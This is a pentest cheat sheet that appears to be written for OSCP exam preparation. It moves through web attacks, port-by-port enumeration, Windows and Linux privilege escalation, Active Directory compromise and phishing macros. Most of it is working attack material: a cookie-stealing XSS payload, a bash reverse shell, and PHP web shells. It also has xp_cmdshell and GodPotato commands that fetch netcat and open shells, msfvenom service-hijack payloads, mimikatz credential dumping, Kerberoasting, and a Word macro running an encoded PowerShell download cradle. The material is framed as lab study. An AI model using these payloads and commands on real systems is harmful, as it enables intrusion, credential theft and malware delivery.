------------------------------------------------------------------cross site scripting-----------------------------------------------------------------------
- XSS SCRIPTS
-      <ScRipT>alert("XSS");</ScRipT>
-     <scr<script>ipt>alert(1)</script>
-     <svg/onload=alert(1)>
-     <a href=javascript:confirm()>click here
-     <img src=`xx:xx`onerror=alert(1)>
-     <img src=//x55.is OnError=import(src)>
-     </script><script >alert(document.cookie)</script>
-     <script>new  Image().src="http://10.0.2.10:4444/bogus.php?output="+escape(document.cookie);</script>

To automate the process, use the following tools
-	xsstrike
-	xsshunter
-	BeEF
-	JShell

-----------------------------------------------------------------Loca File Inclusion-------------------------------------------------------------------------
- Null Byte will ignore the extension
-     ../../../../../../etc/passwd%00.jpg
- php filter
-     php://filter/convert.base64-encode/resource=
-      data://text/plain,<?php echo system('ls');?>
- poising a log file
- /roc/self/environ || /var/log/auth.log [ssh log file] || /var/log/apache2/access.log [web server log file]
- poison the auth.log file
-     Ssh “<?php passthru(base64_decode(‘base64PAYLOAD==’))?>”@10.0.2.13
- execute a php file from an external server
-     ./ngrok http 9000  && python -m SimpleHTTPServer
- execute a command
-     <?php system('ls') ?>
- add cmd as a parameter
-     <?php system($_GET['cmd']); ?>
-     example.com/index.php?view=cat../../../../../../../../../var/log/apache2/access.log&cmd=ls
- add cmd in data wrapper
-      echo -n '<?php echo system($_GET["cmd"]);?>' | base64
-        curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
- bash reverse shell
-     bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
- fuzz LFI
-     ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<RHOST>/admin../admin_staging/index.php?page=FUZZ -fs 15349 --> searching for LFI
- decode (base64) the PHPSESSID, you may find a path for /var/www/html/index.php --> you can change the path inside the cookie, encode it again then send it 
- Linux --> /etc/passwd
     - example.com/index.php?id=1
- windows --> IIS 
     - example.com/index.aspx?id=1
- xampp may run .apache .php .mysql --> so you can't guarantee that the running machine is Windows
- RFI using simple-backdoor.php
-     curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simplebackdoor.php&cmd=ls"

-----------------------------------------------------------------File Upload-------------------------------------------------------------------------
- if the PHP files are blacklisted you can try the following file extensions [phps, php7, phtml]
- also check to play with lower/upper caps example .pHP
- if you used simple-backdoor.php. you need to use cmd for the execution
-     curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
- obtaining a reverse shell on Windows (book page number 271)
-     curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
- if you can't execute the uploaded file. you can try to overwrite the authorized key file in the home directory and connect to SSH with the private key (book page number 275)
-     ssh-keygen 
-     cat <file.pub> authorized_keys
- upload the file in the following path
-     ../../../../../../../root/.ssh/authorized_keys
- before connecting to the SSH delete know_hosts file
-     rm ~/.ssh/know_hosts
-     ssh -p <port> -i <file> root@10.0.2.10


Platforms
1. for Initial Access work on eJPT, This article and official content 
Windows Privilege Escalation use TCM security, official content, YouTube videos
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
https://academy.tcm-sec.com/p/windows-privilege-escalation-for-beginners
Linux Privilege Escalation TCM Linux,  official content, YouTube videos
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
https://academy.tcm-sec.com/p/linux-privilege-escalation
Windows & Linux privilege escalation mind map


LABS Platforms
One of the best choices for a lab is Tjnull, which includes machines from Hack The Box, TryHackMe, Proving Grounds (practice), and the official OffSec labs for play
https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#

1. Initial Access with Different Ports
General:
If you find credentials, use ports 21, 22, 3389, web login pages (HTTP listening ports), port 161 (evil-winram), and databases.
Try a high-access approach first, targeting systems with elevated rights such as RDP and SSH.
Always check the /.ssh/ directory for RSA and authorized keys.
Nmap
-     autorecon <ip>  (best tool with UDP and TCP scan, you don’t want to use -sU -sT)
-     nmap -A -Pn <ip> (Best Nmap command for initial access)
-     nmap -sC -sV -A -T4 -Pn -o 101.nmap 192.168.10.10  ( * always check version for each port vsftp 3.02 exploitable search google or searchsploits)
-     ·Test-NetConnection -Port 445 192.168.10.10 (check 445 is on) 1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $)) "TCP port $ is open"} 2>$null    (check port 1 to 1024)   (for window)
-     For each port nmap -sC -A -p21 <ip>   (for specific Port)

Port 21 FTP:
There is username and password on this you can upload shell on direcotyr or find downloads files for initial access.
-     nmap --script=ftp-* -p 21 $ip  (scan complete FTP Port)
check if anonymous allowed then use ftp anonymous@ip  (password also anonymous)
there is some mod if ls dir not work then apply use passive (to go in active mod).
-     ·mget * (# Download everything from current directory like zip, pdf, doc)
send/put (# Send single file or upload shell command)
after download files always use exiftool –u -a <filename> (Meta description for users)
·FTP version above 3.0 not exploitable

Port 22 SSH:
you can’t get initial access directly however we can login with user and password and private key.
-     ssh raman@ip
-     ssh -p 2222 raman@192.168.10.10 ( ssh use with different port )
-     curl http://<ip>/index.php?page=../../../../../../../../../home/raman/.ssh/id_rsa
-     chmod 600 id_rsa  and then ssh -i id_rsa -p 2222 raman@ip
-     user/.ssh/authorized key

PORT 25 (relying server to server) 465 (mail client to server)
You can send phishing email with this port to get reverse shell.
Used to send, receive, and relay outgoing emails and Main attacks are user enumeration and using an open relay to send spam
-     nmap 192.168.10.10 --script=smtp* -p 25
always login with telnet <ip> 25

Port 53 DNS:
General enumeration for domain to find hostname and subdodmain etc
-     Nslookup <ip>   | Dig <ip> | Host <ip> | host -t ns $ip  | subdomains, host , ip | dnsenum

Port 80 , 8080, 443:
When executing Nmap, you may discover HTTP ports like 80, 81, 8080, 8000, 443, etc. There's a possibility of finding four HTTP ports on one machine.
In the very first step, run Nmap with an aggressive scan on all ports:
-     nmap -sC -sV -A -T4 -Pn -p80,81,8000,8080,443 192.168.146.101
Simply copy the version name of the website and search on Google to find an exploit.
Furthermore, Nmap reveals some files such as robots.txt, index.html, index.php, login.php, phpinfo, cgi-sys, cgi-mod, and cgi-bin.
If you encounter a host error, find a hostname with port 53 or discover a name in the website source code, footer, contact us, etc.
Then add that discovered domain in the /etc/hosts file to access the site.

Content Discovery:
-     gobuster dir -u http://192.168.10.10 -w  /wd/directory-list-2.3-big.txt (simple run)
-     gobuster dir -u http://192.168.10.10:8000 -w  /wd/directory-list-2.3-big.txt (with different port)
-     gobuster dir -u http://192.168.10.10/raman -w  /wd/directory-list-2.3-big.txt (if you find raman then enumerate raman directory)
With the help of content discovery, you will find hidden directories, CMS web logins, files, etc. This is a crucial step in OSCP.
Utilizing content discovery and Nmap, you can identify CMS, static pages, dynamic websites, and important files like databases, .txt, .pdf, etc. Additionally, you can enumerate websites with automated tools such as WPScan, JoomScan, Burp Suite, and uncover web vulnerabilities like RCE, SQLi, upload functionality, XSS, etc.
If you find any CMS like WordPress, Joomla, etc., simply search on Google for default credentials or exploits of theme, plugin, version etc. In the case of a login page, you can exploit SQL injection and launch a brute-force attack with Hydra. If you identify any CMS, scan it with tools, perform enumeration with brute force, check default usernames and passwords, explore themes, plugins, version exploits, and search on Google. Alternatively, you can discover web vulnerabilities to gain initial access.

wpscan
-     wpscan --url http://10.10.10.10 --enumerate u
-     wpscan --url example.com -e vp --plugins-detection mixed --api-token API_TOKEN
-     wpscan --url example.com -e u --passwords /usr/share/wordlists/rockyou.txt
-     wpscan --url example.com -U admin -P /usr/share/wordlists/rockyou.txt

Drupal
-     droopescan scan drupal -u http://example.org/ -t 32
find version > /CHANGELOG.txt

Adobe Cold Fusion
check version /CFIDE/adminapi/base.cfc?wsdl
fckeditor Version 8  LFI
-     http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
-     sudo msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.10.12 LPORT=4545 -f raw > raman.jsp
save the payload in the following directory
-     C:\ColdFusion8\wwwroot\CFIDE\raman.jsp
Elastix
Google the vulnerabilities
default login are admin:admin at /vtigercrm/
able to upload shell in profile-photo

Joomla
Admin page - /administrator
Configuration files configuration.php | diagnostics.php | joomla.inc.php |  config.inc.php

Mambo
Config files >> configuration.php | config.inc.php

Login page
Try common credentials such as admin/admin, admin/password and falafel/falafel.
Determine if you can enumerate usernames based on a verbose error message.
Manually test for SQL injection. If it requires a more complex SQL injection, run SQLMap on it.
If all fails, run hydra to brute force credentials.
View source code
Use default password
Brute force directory first (s’’ometime you don't need to login to pwn the machine)
Search credential by bruteforce directory
bruteforce credential
Search credential in other service port
Enumeration for the credential
Register first
SQL injection
XSS can be used to get the admin cookie
Bruteforce session cookie

Web Vulnerability:
SQLi:
Pentestmonkey cheatsheet
-     Try admin'# (valid username, see netsparker sqli cheatsheet)
-     Try abcd' or 1=1;--
-     Use UNION SELECT null,null,.. instead of 1,2,.. to avoid type conversion errors

For mssql,
xp_cmdshell
Use concat for listing 2 or more column data in one

For mysql,
try a' or 1='1 -- -
A' union select "" into outfile "C:\xampp\htdocs\run.php" -- -'

File Upload:
Change mime type
Add image headers
Add payload in exiftool comment and name file as file.php.png
-     <?php system($_GET['cmd']); ?> //shell.php
-     exiftool "-comment<=shell.php" malicious.png
-     strings malicious.png | grep system

use automated tool
-     nikto -h $ip
-     nikto -h $ip -p 80,8080,1234 

Git
Download .git
mkdir <DESTINATION_FOLDER>
./gitdumper.sh <URL>/.git/ <DESTINATION_FOLDER>
Extract .git content
mkdir <EXTRACT_FOLDER>
./extractor.sh <DESTINATION_FOLDER> <EXTRACT_FOLDER>

LFI and RFI 
IF LFI FOUND then start with
-     ../../../../etc/passwd
SSH keys are
By default, SSH searches for id_rsa, id_ecdsa, id_ecdsa_sk, id_ed25519, id_ed25519_sk, and id_dsa  | 
-     curl http://rssoftwire.com/raman/index.php?page=../../../../../../../../../home/raman/.ssh/id_rsa
with encode
-     curl http://192.168.10.10/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

SSL Enumeration 
-     Open a connection openssl s_client -connect $ip:443
Port 161 UDP:
This will give you the username password or any hint for login
It will get with autorecon (UDP Port)
-     nmap -sU -p161 --script "snmp-*" $ip
-     nmap -n -vv -sV -sU -Pn -p 161,162 –script=snmp-processes,snmp-netstat IP
-     snmpwalk -v 1 -c public 192.168.10.10  NET-SNMP-EXTEND-MIB::nsExtendOutputFull (this is command I have used in 2 3 machine to find username, password, or hint of user and pass
-     evil-winrm -I 192.168.10.10 -u ‘raman’ -p ‘ramanpassword’  (login with this command)
PORT 139, port 445  (also PORT 137 (name services) & PORT 138 (datagam) UDP netbios)
Always check guest login and then check public share with write and execute permission and you will find credential, files pdf ps1 etc
-     nmap -v -script smb-vuln* -p 139,445 10.10.10.10
-     smbmap -H 192.168.10.10   (public shares) (check read write and execute)
-     smbmap -H 192.168.10.10 -R tmp   (check specific folder like tmp)
-     enum4linux -a 192.168.10.10   (best command to find details and users list)
-     smbclient -p 4455 -L //192.168.10.10/ -U raman --password=raman1234
-     smbclient -p 4455 //192.168.10.10/scripts -U raman --password raman1234  (login)
Port 3389 RDP
There are two methods for this port: one involves finding credentials with another port, and the other employs brute force.
There is only one method to find credentials on this port, which involves a brute force attack using Hydra
-     hydra -t 4 -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip
then further login with xfreerdp
-     xfreerdp /v:raman /u:passwordraman /p:192.168.10.10 /workarea /smart-sizing
-     rdesktop $ip
PORT 3306 MySQL
Find credential with other port and use default to login
-     nmap -sV -Pn -vv -script=mysql* $ip -p 3306
-     mysql -u root -p 'root' -h 192.168.10.10 -P 3306
-     select version(); | show databases;  | use databse | select * from users; | show tables |  select system_user(); | SELECT user, authentication_string FROM mysql.user WHERE user = Pre
MSSQL 1433, 4022, 135, 1434, UDP 1434
For this port, you can find credentials from another port and log in with ipacket-mssqlclient
-     nmap -n -v -sV -Pn -p 1433 –script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password $ip
-     impacket-mssqlclient raman:'raman@321@1!'@192.168.10.10
-     impacket-mssqlclient Administrator: 'raman@321@1!'@192.168.10.10 -windows-auth
-     SELECT @@version;  | SELECT name FROM sys.databases;  | SELECT  FROM offsec.information_schema.tables;  |  select  from offsec.dbo.users;
Connect as CMD database
-     SQL> EXECUTE sp_configure 'show advanced options', 1;
-     SQL> RECONFIGURE;
-     SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
-     SQL> RECONFIGURE;
-     EXEC xp_cmdshell 'whoami';
-     exec xp_cmdshell 'cmd /c powershell -c "curl 192.168.10.10/nc.exe -o \windows\temp\nc.exe"';
-     exec xp_cmdshell 'cmd /c dir \windows\temp';
-     exec xp_cmdshell 'cmd /c "\windows\temp\nc.exe 192.168.10.10 443 -e cmd"';
also applied on SQL Injection login
PORT 5437 & PORT 5432 PostgreSQL
If you find this port, follow the commands below, and you can easily find credentials from another port as well
5437/tcp open   postgresql   PostgreSQL DB 11.3 - 11.7
-     msf6 exploit(linux/postgres/postgres_payload) > options and set all values rhost lhost port LHOST  tun0
-     OR | psql -U postgres -p 5437 -h IP  |  select pg_ls_dir(‘./’);  | select pg_ls_dir(‘/etc/password’);  | select pg_ls_dir(‘/home/wilson’);  | select pg_ls_dir(‘/home/Wilson/local.txt’);
2. Windows Privilege Escalation
I have used this approach:
Run whoami /all (if enabled, then use printspoofer or got potato).
Simply run PowerUp, then find privileges on unquoted DLL, etc.
Upload WinPEAS for further enumeration if the above does not work. WinPEAS mostly finds plaintext passwords.
Lastly, find any executable (exe), PowerShell script (ps1), or PDF file running. Run it for further enumeration and search on Google for additional details.
Upload
-     certutil.exe -urlcache -split -f http://192.168.10.10/PowerUp.ps1 ( only run on cmd)
-     iwr -uri http://192.168.10.10/PowerUp.ps1 -Outfile PowerUp.ps1 (power shell)
-     curl 192.168.10.10/PowerUp.ps1 -Outfile PowerUp.ps1 (both)
-     Start http server with python3 -m http.server 80 or 81 etc
Plaintext Password
-     Folders Name: C Folder | Document Folder
To find a password
-     run winpeas
-     check history with command
-     check exe files in C or desktop etc
-     \users\raman\documents\fileMonitorBackup.log
File Permission
F> Full access | M> Modify access |RX> Read and execute access| R>Read-only access| W>Write-only
-     icacls "C:\xampp\apache\bin\fida.exe"  (check permission)
 Automated Tools
Powerup
-     certutil.exe -urlcache -split -f http://192.168.10.10/PowerUp.ps1
powershell -ep bypass
-     .\PowerUp.ps1
Invoke-AllChecks (check all possible vulnerability except plaintext passwd)
Winpeas.exe (all including plaintext passwd)
Windpeas.exe If .net 4.5 (run otherwise)
-     certutil.exe -urlcache -split -f http://192.168.10.10:8080/winPEASx64.exe
-     .\winPEASx64.exe
 Manual Enumeration
-     Systeminfo   OR  systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
-     Hostname | Whoami | wmic qfe (updates and patches etc)
-     Wmic logicaldisk (drives)
-     echo %USERNAME% || whoami then $env:username
-     Net user | net user raman
-     Net localgroup | net localgroup raman
-     netsh firewall show state (firewall)
-     Whoami /priv
-     Ipconfig | ipconfig /all  |
-     netstat -ano | route print
-     Powershell | Get-LocalUser | Get-LocalGroup | Get-LocalGroupMember Administrators
-     Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname   (check software with version 32 bit and below 64)
-     Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
-     Get-Process
If RDP is enable or we enable it then add this
-     net localgroup administrators /add
-     Unattended Windows Installatiom (old files of user n pass then crack)
-     dir /s sysprep.inf sysprep.xml unattended.xml unattend.xml *unattended.txt 2>null
GoldMine Password/plaintext
1st Technique (Common Password)
https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
Readable location
-     findstr /si password .txt | .xml | *.ini
Registry  | (IF VNC install)
-     reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" (autologin)
Configuration | files with winpeas
-     SAM  |winpeas (looking for common Sam and System backups)
Attacker machine move then dcrypt with tool creddump-master
./pwdump.py SYSTEM SAM
OR
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue (findbackup file)
Get-ChildItem -Path C:\xampp -Include .txt,.ini -File -Recurse -ErrorAction SilentlyContinue (check files) | type C:\xampp\passwords.txt | type C:\xampp\mysql\bin\my.ini
Get-ChildItem -Path C:\Users\dave\ -Include .txt,.pdf,.xls,.xlsx,.doc,.docx -File -Recurse -ErrorAction SilentlyContinue   (check doc txt etc)
Another goldmine powershell Get-History   | (Get-PSReadlineOption).HistorySavePath (found file then type raman.txt and if found command then do it because of taken root
cd C:\ | pwd | dir
 SeImpersonatePrivilege enable
Whoami /priv and Whoami /all
Printspoofer
curl 192.168.10.10/PrintSpoofer64.exe -o Pr.exe
.\Pr.exe -i -c cmd  OR .\PrintSpoofer32.exe -i -c powershell.exe
GODpotato
curl 192.168.10.10:8081/GodPotato-NET2.exe -o god.exe
.\god.exe -cmd "cmd /c whoami"    OR
curl 192.168.10.10:8081/nc.exe -o nc.exe
.\god.exe -cmd "cmd /c C:\xampp\htdocs\cms\files\nc.exe 192.168.10.10 443 -e cmd"
.\god.exe -cmd "cmd /c C:\xampp\htdocs\cms\files\nc.exe 192.168.10.10 443 -e powershell"
Kernel Exploits
•         Biopath modifiable service
Get-ModifiableServiceFile
•         Permission check and service stop / start check
•         Msfvenom create shell and upload ( curl, iwr, certutil)
•         icacls "C:\Program Files"
•         msfvenom -p windows/shell_reverse_tcp lhost=192.168.10.10 lport=443 -f exe -o rev.exe
•         del "C:\program files\raman\raman.exe"
•         curl 192.168.10.10/rev.exe -o raman.exe
•         cp raman.exe "C:\program files\raman\"
•         net start raman
 unquoted path
•         Get-UnquotedService
•         Permission check and service stop / start check
•         Msfvenom create shell and upload ( curl, iwr, certutil)
•         icacls "C:\Program Files"
•         msfvenom -p windows/shell_reverse_tcp lhost=192.168.10.10 lport=443 -f exe -o rev.exe
•         del "C:\program files\raman\raman.exe"
•         curl 192.168.10.10/rev.exe -o raman.exe
•         cp raman.exe "C:\program files\raman\"
•         net start raman
DLL Hijacking
•         Permission check and service stop / start check
•         Msfvenom create shell and upload ( curl, iwr, certutil)
•         icacls "C:\Program Files"
•         msfvenom -p windows/shell_reverse_tcp lhost=192.168.10.10 lport=443 -f dll -o rev.dll
•         del "C:\program files\raman\raman.dll"
•         curl 192.168.10.10/rev.dll -o raman.dll
•         cp raman.dll "C:\program files\raman\"
•         net start raman
 Task scduler/cron job
·         schtasks /query /fo LIST /v  (find taskName: \Microsoft\CacheCleanup)
·         icacls C:\Users\raman\Pictures\Cleanup.exe    user (I)(F) permission required)
•         iwr -Uri http://192.168.10.10/adduser.exe -Outfile Cleanup.exe
•         move .\Pictures\BackendCacheCleanup.exe Cleanup.exe.bak
•         move .\Cleanup.exe .\Pictures\  (waiting for the execution and put file just one before the folder)
Linux Privilege Escalation
Start with automated tools like LinPEAS, then proceed with manual enumeration. The following command is used to get a TTY shell
python3 -c 'import pty; pty.spawn(["/bin/bash", "--rcfile", "/etc/bash.bashrc"])' --> full access shell
Automated Tools
·         python -m http.server 80
·         wget http://192.168.10.10/linpeas.sh -o linpeas.sh
·         chmod +x linpeas.sh | ./linpeas.sh     | ( ./linpeas.sh | tee filename.txt  )
Manual Enumeration
Approach permission checker/cron job/
cmd: ls -la /etc/passwd/ | ls -la /etc/shadow -- > check read/write permission | sudo su
sudo -l ( https://gtfobins.github.io/#)
find / -user root -perm -4000 -print 2>/dev/null
getcap -r / 2>/dev/null (capabilities)(cap_setuid+ep)
find / -perm -u=s -type f 2>/dev/null
find / -type f -perm 0777 | find / -writable -type d 2>/dev/null
cat /etc/crontab (normal) | grep "CRON" /var/log/syslog (wildcarts)
history | cat .bashrc
GoldMine Password/plaintext
Backup files
Kernel Search with Google
motd.legal-displayed
4. Active Directory.
Active OSCP is challenging for everyone, and soon I am going to create videos on YouTube. In Active Directory, there are three different machines: Machine01, Machine02, Domain01. The Machine01 machine always begins with initial enumeration and privilege escalation as a standalone. Please use the following steps to work on Active Directory:
1.       Run net user /domain.
2.       List users and run sharpHound.ps1 to find domain users (otherwise not in user list) and also with the steps below.
3.       Run secretdumps, and if you come from a reverse shell, then change the administrator password.
4.       For tunneling (use Chisel or run with SSH), if there is an issue, revert the machine.
5.       Find user and password from secretdumps, mimikatz c drive, config files, winpeas, etc.
6.       Check services with open ports such as 22, 1433, 5896, 5895, 445, etc.
7.       Use CrackMapExec with user and password, testing with the above services.
8.       Perform AS-REP Roasting with GetUserSPN.py or Rubeus.exe.
9.       If SQL, use mssqlclient.py; if SMB, use psexec.py; if WinRM or evil-winrm, check the administrator, then move to the next step to find the Windows root.
10.   For Domain01:
11.   Run secretsdump (Default administrator) with user pass or hash, same with psexec, winrm, SSH, etc.
12.   Directly rooted."
Machine01
After get privilege escalation then run following commands
·         Transfer SharpHound.ps1 to target & load in powershell ::
·         . . \SharpHound.ps1
·         Invoke-BloodHound -CollectionMethod All
·         Found users account domain01  (if you find user then don’t use below step)
·         transfer bloodhound.zip on kali
·         Create a new user (if you want or change administrator password)
·         net user raman raman@321 /add
·         net localgroup administrators raman /add
·         net user administrator raman@123 (password Changed of administrator)
·         run secret dump or use mimikatz to find user and password on machine01
·         use impacket for secret dump https://github.com/fortra/impacket
·         python3 ./secretsdump.py ./administrator: raman@123@192.168.10.10 (check domain users with oscp.exam specially default username and password
·         for MimiKatz   privilege::debug | token::elevate | sekurlsa::logonpasswords
Machine02
The first step is to start port forwarding, followed by running AS-REP Roasting with GetUserSPNs.py for Linux and Rubeus.exe for Windows. If neither method works, manually enumerate in Windows to find the username and password or again use mimikatz. If you are not an administrator, apply Windows privilege escalation techniques on it. This will help you gain privileges on Machine02.
·         run map on Macine02 with proxychains nmap -sT -sU -p22,161,135,139,445,88,3389 10.10.10.10
Port Forward with SSH   (if port 22 is open in machine01)
·         ssh -D 8001 -C -q -N raman@192.168.10.10
·         in /etc/proxychains4.conf  (add 127.0.0.1 9999)
·         socks5 127.0.0.1 8001
Port Forward with chisel
·         socks5 127.0.0.1 1080 add this in /etc/proxychains
·         ./chisel server -p 5555 --reverse
·         certutil -urlcache -split -f http://192.168.100.100/chisel-x64.exe
·         chisel client 192.168.100.100:5555 R:socks
·         this is best article for chisel installation
·         https://vegardw.medium.com/reverse-socks-proxy-using-chisel-the-easy-way-48a78df92f29
WINDOW Kerberoasting with window Machine02
·         .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
·         sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule –force
OR
./GetUserSPNs.py  For Macine02 
·         make user firewall if off and you are local admin etc)
·         proxychains python3 impacket-GetNPUsers oscp.exam/raman:raman@123 -dc-ip 10.10.100.100
·         sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule –force
If SQL, use mssqlclient.py; if SMB, use psexec.py; if WinRM or evil-winrm, check the administrator, then move to the next step to find the Windows root. If you find a lot of username and password then use crackmapexec for SMB, SQL, WinRm or evil-winrm
Domain01
·         run map on Domain01 with proxychains nmap -sT -sU -p22,161,445,88,3389 10.10.10.10
·         check nmap for login and use crackmapexec. If you don’t want to use nmap then
·         simply login with psexec,winrm or winexe
·         if you cant find the username and password then use different method like pass the hash, silver ticket
General information
Reverse Shell
•         Always copy the reverse shell from these links and check directly. If it doesn't work, then encode it with URL or encryption with base64.
•         https://www.revshells.com/
•         https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
Password cracking:
admin:admin admin:password root:root root:toor
Burpsuite if we want to
john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt
sudo gzip -d rockyou.txt.gz
hydra -l raman -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.10.10
hydra -l raman -P /usr/share/wordlists/rockyou.txt 192.168.10.10 http-post
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.10.10 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
hashcat -b    | hashcat.exe -b    (linux and window  benchmark)
customize wordlists
head /usr/share/wordlists/rockyou.txt > demo.txt  | sed -i '/^1/d' demo.txt
if we want to add 1 in all password then | echo \$1 > demo.rule | hashcat -r demo.rule --stdout demo.txt
hash-identifier  (find hash if simple)
hashid    (if id is available "$2y$10$)
ssh2john id_rsa > ssh.hash | hashcat -h | grep -i "ssh"    (port22)
CRACK NTLM with MimiKatz 
TargetWindow Get-LocalUser | open powershell | cd C:\tools | ls (| already install if not then install it) | token::elevate (check user permission) | lsadump::sam (dump all user ntlm) |
KALI vim raman.hash (copy raman hash) | hashcat --help | grep -i "ntlm" (check mode like ntml 1000 value) | hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
Zip cracking
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
zip2john file.zip > zip.john
john zip.john
Port Kill
sudo fuser -k 443/tcp
Client Side Attacks can be done through:
- HTML Application
- Canarytokens then use the following link to check victim's browser
-     https://explore.whatismybrowser.com/useragents/parse/
- cross-site scripting (stored)
- Microsoft Word Macros
-     Sub AutoOpen()  MyMacro  End Sub
-     Sub Document_Open()  MyMacro  End Sub
- encode the following PowerShell reverse shell
-     IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
- use the following function to split the payload
str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."
n = 50
for i in range(0, len(str), n):
print("Str = Str + " + '"' + str[i:i+n] + '"')
- paste the payload from the function in the macro
 Sub MyMacro()
 Dim Str As String
 
 Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
 Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
 Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
 ...
 Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
 Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
 Str = Str + "A== "
 CreateObject("Wscript.Shell").Run Str
End Sub

- Windows Library Files
- 
